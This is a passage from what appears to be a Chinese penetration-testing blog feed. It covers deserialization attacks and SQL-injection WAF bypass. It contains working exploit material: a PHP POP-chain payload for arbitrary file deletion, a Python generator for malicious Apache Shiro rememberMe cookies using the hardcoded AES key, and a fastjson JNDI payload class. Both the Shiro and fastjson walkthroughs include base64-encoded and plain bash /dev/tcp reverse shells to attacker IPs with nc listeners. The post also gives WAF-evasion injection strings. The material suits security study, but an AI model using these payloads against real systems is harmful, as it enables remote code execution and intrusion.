class="string">&#x27;I am a evil Delete function&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;I am a safe Delete function&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user_data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$user_data</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>代码分析：</strong></p><p>首先我们看最先执行的操作在最下面反序列化GET到的参数data，然后执行echo，这里如果$user_data是一个类实例化来的对象的话，就是将对象作为字符串输出，会触发对象中的<code>__tostring()</code>魔术方法。</p><p>而源码中有三个类，各个类具有不同的方法。</p><blockquote><h4 id="POP链构造："><a href="#POP链构造：" class="headerlink" title="POP链构造："></a>POP链构造：</h4><p>首先出发点是Test1中的<code>__tostring()</code>魔术方法，其中调用了<code>$this-&gt;obj</code>中的Delete()函数，而<code>$this-&gt;obj</code>在实例化对象时会触发<code>__construct</code>方法，将<code>$this-&gt;obj</code>作为实例化Test3类的对象，那么此时调用的就是Test3类中的Delete()函数，只返回一句提示，那么此时的执行流如下：</p><p>实例化Test1类的对象→<code>__construct()</code>→<code>$this-&gt;obj=new Test3</code>→输出该对象时调用<code>__tostring()</code>→Test3的Delete()方法</p><p>不过在Test2类中也定义了和Test3中同名的函数Delete()，该方法可能造成任意文件删除。那么我们可以通过构造特定的反序列化参数来<strong>修改执行流，也就是构造我们自己的POP链，在反序列化后使用Test2类中的Delete()来执行敏感操作</strong>，让执行流如下:</p><p>实例化Test1类的对象→<code>__construct()</code>→<code>$this-&gt;obj=new Test2</code>→输出该对象时调用<code>__tostring()</code>→Test2的Delete方法</p><p>那么POP链的构造就是通过反序列化和echo来触发<code>__tostring()</code>魔术方法，并且此方法中调用Test2中的Delete()方法，造成任意文件删除的危害。</p></blockquote><p>POC如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cache_file</span> = <span class="string">&#x27;../../../../test.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$evil</span> = <span class="keyword">new</span> <span class="title class_">Test1</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$evil</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h3><p>反射 (Reflection) 是 Java 的特征之一，它允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。通过反射，我们可以在运行时获得程序或程序集中每一个类型的成员和成员的信息。通过Java 反射机制，我们可以动态地创建对象并调用其属性，这样的对象的类型在编译期是未知的。</p><p>反射的核心是 JVM 在运行时才动态加载类或调用方法&#x2F;访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。</p><p>Java 反射主要提供以下功能：</p><p>在运行时判断任意一个对象所属的类；<br>在运行时构造任意一个类的对象；<br>在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；<br>在运行时调用任意一个对象的方法<br>重点：是运行时而不是编译时</p><p>反射机制在java反序列化漏洞的利用过程中有很重要的作用。</p><h3 id="java反序列化利用"><a href="#java反序列化利用" class="headerlink" title="java反序列化利用"></a>java反序列化利用</h3><p>Java 序列化过程依赖于 ObjectOutputStream 类中 writeObject 方法，而反序列化的过程是依赖于 ObjectOutputStream 类中 readObject 方法。<strong>若用户重写了自定义的 readObject 方法，那么就有可能产生反序列化的时候命令执行的漏洞点。</strong>或者用户精心构造恶意的类的序列化字符串，那么在反序列化实例化这个类时就会执行其中的恶意代码（比如rmi远程代码）。</p><p>利用java反射重写 readObject 方法：</p><p>反射机制的存在使得我们可以越过Java本身的静态检查和类型约束，在运行期直接访问和修改目标对象的属性和状态。Java反射的四大核心是 Class，Constructor，Field，Method。通过反射的方法重写readObject：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ReflectionCalcObject.java</span></span><br><span class="line"><span class="keyword">package</span> com.l1nk3r.reflect;</span><br><span class="line"><span class="keyword">import</span> java.io. * ;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectionCalcObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in )</span> <span class="keyword">throws</span> IOException,</span><br><span class="line">    ClassNotFoundException &#123; in .defaultReadObject(); <span class="comment">//调用原始的readOject方法</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//通过反射方法执行命令；</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> java.lang.Runtime.class.getMethod(“exec”, String.class);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(Runtime.getRuntime(), “open / Applications / Calculator.app / “);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过运行 java.lang.Runtime 这个类的 .class 属性，并使用 getMethod 方法来获取我们要执行命令的方法 exec ，最后我们通过 invoke 来实现注册这个方法，打开计算器。</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul><li><p>最有效的方法是<strong>不接受来自不受信任源的序列化对象</strong>或者只使用原始数据类型的序列化，但这不容易实现。</p></li><li><p><strong>完整性检查</strong>，如：对序列化对象进行数字签名，以防止创建恶意对象或序列化数据被篡改。</p></li><li><p>在创建对象前强制执行<strong>类型约束</strong>，因为用户的代码通常被期望使用一组可定义的类。</p></li></ul><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="wakeup-函数绕过"><a href="#wakeup-函数绕过" class="headerlink" title="__wakeup()函数绕过"></a>__wakeup()函数绕过</h3><p>只要序列化的中的成员数大于实际成员数，<code>__wakeup()</code>魔术方法将不会被执行，从而导致绕过。</p><p>注意，需要<strong>PHP版本&lt;&#x3D;5.6.25或者PHP版本&lt;&#x3D;7.0.11</strong>。</p><p>举一个简单的例子，考虑一个使用序列化<code>User</code>对象的网站，该网站将有关用户会话的数据存储在cookie中。如果攻击者在HTTP请求中发现了序列化对象，则可能会对其进行解码以找到以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:”username”:s:6:”carlos”; s:7:”isAdmin”:b:0;&#125;</span><br></pre></td></tr></table></figure><p>注意到这里的isAdmin属性，攻击者可以简单地将该属性的布尔值更改为<code>1</code>(true)，重新编码对象，然后使用此修改后的值覆盖其当前cookie。</p><p>以及，修改</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>参考：<a href="https://www.freebuf.com/articles/web/286442.html">https://www.freebuf.com/articles/web/286442.html</a></p><h3 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h3><p><a href="https://blog.csdn.net/huangyongkang666/article/details/124175812">https://blog.csdn.net/huangyongkang666/article/details/124175812</a></p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>低版本的apache shiro （ &lt;&#x3D; 1.2.4版本）默认使用了CookieRememberMeManager。当用户勾选RememberMe并登录成功，Shiro会将用户的cookie值序列化，AES加密，接着base64编码后存储在cookie的rememberMe字段中。而服务端接收到cookie后：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码在源码中的，所以当攻击者知道了AES key后，就能够构造恶意的rememberMe cookie值从而导致反序列化的RCE漏洞。</p><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><p>返回包中含有rememberMe&#x3D;deleteMe字段</p><h4 id="用到的工具"><a href="#用到的工具" class="headerlink" title="用到的工具"></a>用到的工具</h4><ol><li><p><strong>ysoserial</strong></p><p>ysoserial集合了各种java反序列化payload，下载地址为<code>https://github.com/frohoff/ysoserial</code>。</p><p>安装过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/frohoff/ysoserial.git</span><br><span class="line">cd ysoserial</span><br><span class="line">mvn package -D skipTests //需要安装maven才能使用mvn命令</span><br></pre></td></tr></table></figure></li><li><p><strong>shiro_tool.jar</strong></p><p>集成化工具，下载地址为<code>https://toolaffix.oss-cn-beijing.aliyuncs.com/shiro_tool.jar</code>。</p><p>可用于获取目标IP的shiro中是否存在默认的AES密钥。命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar shiro_tool.jar http://192.168.241.129:8080</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813135453985.png" alt="image-20220813135453985"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure></li></ol><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li><p><strong>测试</strong>能否使用rememberMe字段</p><p>使用burp抓取当前页面数据包，在cookie中添加rememberMe&#x3D;1。若响应包中显示Set-Cookie: rememberMe&#x3D;deleteMe，说明存在shiro框架，可能存在漏洞。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813135630795.png" alt="image-20220813135630795"></p></li><li><p><strong>监听并构造反弹shell</strong></p><p>通过 <strong>ysoserial</strong> 中的 JRMP 监听模块，监听4444端口并执行反弹shell命令。</p><p>反弹shell命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.241.128/4444 0&gt;&amp;1   //需要base64编码，在线编码http://www.jackson-t.ca/runtime-exec-payloads.html</span><br><span class="line"></span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0MS4xMjgvNDQ0NCAwPiYx==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0MS4xMjgvNDQ0NCAwPiYx==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure><p>单引号中的就是要执行的命令</p></li><li><p><strong>构造payload</strong></p><p>利用检测出的AES密钥，生成payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">command</span>):   <span class="comment"># shellcode</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)  <span class="comment"># AES密钥</span></span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure><p>执行上述代码：<code>python shiro.py 192.168.241.129:6666</code>，得到payload，即恶意的rememberMe。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813140942501.png" alt="image-20220813140942501"></p></li><li><p><strong>开启nc监听</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 6767</span><br></pre></td></tr></table></figure></li><li><p><strong>抓包，插入恶意rememberMe</strong></p><p>抓包，在cookie中将上面恶意构造的rememberMe发送出去：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813141259824.png" alt="image-20220813141259824"></p></li><li><p><strong>成功getshell</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813141345531.png" alt="image-20220813141345531"></p></li></ul><h3 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。</p><p>在Java 8u102环境下，没有com.sun.jndi.rmi.object.trustURLCodebase的限制，可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令。</p><h4 id="用到的工具-1"><a href="#用到的工具-1" class="headerlink" title="用到的工具"></a>用到的工具</h4><p>预先安装maven并配置环境变量，下载marshalsec，进入marshalsec 目录，使用mvn clean package -DskipTests命令编译出marshalsec的jar包</p><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li><p><strong>生成payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.2.101/6767 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">pc.waitFor();</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// do nothing</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行编译生成.class文件。搭建服务，要测试能直连TouchFile.class ，才会执行文件里的命令。</p></li><li><p><strong>开启rmi服务</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.2.101:4444/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure><p>其中<code>http://192.168.2.101:4444</code>为你的rmi服务器的地址，9999为rmi监听的端口</p></li><li><p><strong>开启nc监听</strong>，6767为监听的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 6767</span><br></pre></td></tr></table></figure></li><li><p><strong>发包</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813142233557.png" alt="image-20220813142233557"></p></li><li><p><strong>获得shell</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813142311472.png" alt="image-20220813142311472"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;反序列化漏洞&quot;&gt;&lt;a href=&quot;#反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;反序列化漏洞&quot;&gt;&lt;/a&gt;反序列化漏洞&lt;/h1&gt;&lt;p&gt;参考：&lt;a href=&quot;https://www.anquanke.com/post/id/224769&quot;&gt;h</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入-WAF绕过</title>
    <link href="https://frankcao3.github.io/posts/24600"/>
    <id>https://frankcao3.github.io/posts/24600</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.976Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WAF简介"><a href="#WAF简介" class="headerlink" title="WAF简介"></a>WAF简介</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>WAF(Web Application Firewall)的具有以下四个方面的功能：</p><ul><li><p><strong>会话审计</strong></p><p>用来截获所有HTTP数据或者仅仅满足某些规则的会话</p></li><li><p><strong>访问控制</strong></p><p>用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式</p></li><li><p><strong>架构&#x2F;网络设计</strong></p><p>当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。</p></li><li><p><strong>WEB应用加固</strong></p><p>这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。</p></li></ul><p><strong>常用功能包括：</strong></p><p>1.网马木马主动防御及查杀</p><p>2.流量监控</p><p>3.网站漏洞防御</p><p>4.危险组件防御</p><p>5..Net安全保护模块</p><p>6.双层防盗链链接模式</p><p>7.网站特定资源防下载</p><p>8.CC攻击防护</p><p>9.网站流量保护</p><p>10.IP黑白名单</p><h3 id="WAF防护手段"><a href="#WAF防护手段" class="headerlink" title="WAF防护手段"></a>WAF防护手段</h3><p><strong>异常检测机制</strong>：拒绝不符合HTTP标准的请求</p><p><strong>增强的输入验证</strong>：代理和服务端的验证，而不只是限于客户端验证</p><p><strong>白名单&amp;黑名单</strong>：白名单适用于稳定的We应用，黑名单适合处理已知问题</p><p><strong>基于规则和基于异常的保护</strong>：基于规则更多的依赖黑名单机制，基于异常更为灵活</p><p><strong>状态管理</strong>：重点进行会话保护</p><p><strong>信息泄露保护</strong>：防止服务器信息泄露。</p><p>另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等</p><p>如果是对于扫描器，WAF有其识别之道：</p><p><strong>扫描器识别主要由以下几点：</strong></p><ol><li>扫描器指纹(head字段&#x2F;请求参数值)，以wvs为例，会有很明显的Acunetix在内的标识 </li><li>单IP+ cookie某时间段内触发规则次数 </li><li>隐藏的链接标签等() </li><li>Cookie植入 </li><li>验证码验证，扫描器无法自动填充验证码 </li><li>单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏感目录基于字典，找不到文件则返回404</li></ol><h3 id="常见WAF产品"><a href="#常见WAF产品" class="headerlink" title="常见WAF产品"></a>常见WAF产品</h3><ul><li><p><strong>硬件WAF</strong></p><p>如果是串联到链路中，则可以拦截恶意流量，如果是以旁路的形式部署，则只能记录攻击但是不能拦截。硬件型WAF一般而言比软件型WAF更加昂贵，但是检测速度快，不易称为网站瓶颈。</p><p>如绿盟、启明、安恒、创宇、神州数码</p></li><li><p><strong>软件WAF</strong></p><p>安全狗、D盾、云锁、中间件自带的waf</p></li><li><p><strong>云WAF</strong></p><p>阿里云、安全狗、创宇、安恒等</p></li></ul><h2 id="WAF防护绕过"><a href="#WAF防护绕过" class="headerlink" title="WAF防护绕过"></a>WAF防护绕过</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727205214531.png" alt="image-20220727205214531"></p><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>在语句中添加某些特殊符号，并不会影响语句的执行效果。在waf绕过中，检测这些特殊符号干扰了检测机制，从而绕过检测。 </p><h4 id="通过注释符号-x2F-x2F-进行绕过"><a href="#通过注释符号-x2F-x2F-进行绕过" class="headerlink" title="通过注释符号&#x2F;**&#x2F;进行绕过"></a>通过注释符号&#x2F;**&#x2F;进行绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database/**/();</span><br><span class="line">+-------------+</span><br><span class="line">| database () |</span><br><span class="line">+-------------+</span><br><span class="line">| security    |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h4 id="通过-0A为换行符；-23为-号；-20为空格实现绕过"><a href="#通过-0A为换行符；-23为-号；-20为空格实现绕过" class="headerlink" title="通过%0A为换行符；%23为#号；%20为空格实现绕过"></a>通过%0A为换行符；%23为#号；%20为空格实现绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=-1 /*%0a*/union/*%0a*/select/*%0a*/1,2,3</span><br><span class="line">相当于</span><br><span class="line">union</span><br><span class="line">select</span><br><span class="line">1,2,3</span><br><span class="line"></span><br><span class="line">select * from users where id=-1 union%23a%0Aselect 1,2,3%23   // select a union的组合可以将安全狗屏蔽掉</span><br><span class="line">相当于</span><br><span class="line">union #a</span><br><span class="line"></span><br><span class="line">select 1,2,3#</span><br></pre></td></tr></table></figure><h4 id="内联注释绕过-原理"><a href="#内联注释绕过-原理" class="headerlink" title="内联注释绕过/*!*/原理"></a>内联注释绕过<code>/*!*/</code>原理</h4><p><code>/*!*/</code>符号内语句不会注释，可以正常的执行。</p><p><code>/*!select * from users*/</code>的结果如下：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/973eec3ae8780068054370c04685751813422942.png@527w_419h_progressive.webp" alt="img"></p><ul><li><p><code>/** #*/</code>原理</p><p>比如<code>id=1/**&amp;id=-1 union select 1,2,3#*/</code></p><p>安全狗检测到的：<code>id=1</code>，以为<code>/***/</code>里面是注释不执行</p><p>但是Apache检测到的：<code>-1 union select 1,2,3#*/</code> 会以后一个id值为准</p></li></ul><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><h4 id="大小写-x2F-关键字替换"><a href="#大小写-x2F-关键字替换" class="headerlink" title="大小写&#x2F;关键字替换"></a>大小写&#x2F;关键字替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id=1 UnIoN/**/SeLeCT 1,user()</span><br><span class="line">Hex() bin() 等价于ascii()</span><br><span class="line">Sleep() 等价于 benchmark()</span><br><span class="line">Mid()substring() 等价于 substr()</span><br><span class="line">@@user 等价于 User()</span><br><span class="line">@@Version 等价于 version()</span><br></pre></td></tr></table></figure><h4 id="编码解码及加密解密"><a href="#编码解码及加密解密" class="headerlink" title="编码解码及加密解密"></a>编码解码及加密解密</h4><p>hex,urlcode,base64等</p><p>比如关键字全部被拦截，那么尝试使用URL全编码的方式绕过拦截。由于服务器会自动对URL进行一次URL解码， 所以需要把关键词编码两次，这里需要注意的地方是，URL编码需选择全编码，而不是普通的URL编码。</p><h4 id="更改请求提交方式"><a href="#更改请求提交方式" class="headerlink" title="更改请求提交方式"></a>更改请求提交方式</h4><p>GET POST COOKIE等</p><p>POST-&gt;multipart&#x2F;form-data</p><h4 id="中间件HPP参数污染"><a href="#中间件HPP参数污染" class="headerlink" title="中间件HPP参数污染"></a>中间件HPP参数污染</h4><p><strong>HPP</strong>是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p><p><strong>参数污染源原理</strong></p><p>在HTTP协议中允许同样名称的参数出现多次，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。</p><p>假设这个URL：<code>http://www.xxxx.com/search.php?id=110&amp;id=911</code>，主要有三种情况。</p><p>百度会理解成让百度搜索: 110           # 选择了第一一个参数,放弃了第二个参数。</p><p>雅虎会理解成让雅虎搜索: 911           # 选择了第二个参数,放弃了第一个参数。</p><p>谷歌会理解成让谷歌搜索: 110 911   # 两个参数同时选择。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/20210608112521171.png" alt="img"></p><h3 id="数据库特性"><a href="#数据库特性" class="headerlink" title="数据库特性"></a>数据库特性</h3><h4 id="Mysql技巧"><a href="#Mysql技巧" class="headerlink" title="Mysql技巧"></a>Mysql技巧</h4><p>（1）mysql注释符有三种：#、&#x2F;<em>…</em>&#x2F;、–   (注意–后面有一个空格)</p><p>（2）空格符：[0x09, 0x0a-0x0d, 0x20, 0xa0]</p><p>（3）特殊符号：%a 换行符</p><p>  